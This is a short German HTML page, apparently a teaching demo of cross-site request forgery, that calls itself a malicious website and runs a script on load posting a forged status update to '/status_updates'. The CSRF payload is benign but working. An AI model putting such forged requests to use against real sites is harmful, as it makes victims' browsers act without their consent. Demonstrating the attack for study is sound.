<html>
<head>
	<title>CSRF-Angreifer</title>
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
</head>
<body>
<p>Vielen Dank, dass Sie unsere bösartige Webseite besucht haben!</p>


<!-- CSRF über POST -->

<script type="text/javascript">
var xmlHttp = new XMLHttpRequest();
if (xmlHttp) {
	xmlHttp.open('POST', '/status_updates', true);
	xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	xmlHttp.send("status_update[author]=CSRF&status_update[status]=" + escape("CSRF-Angriff per POST"));
}
</script>

</body>
</html>
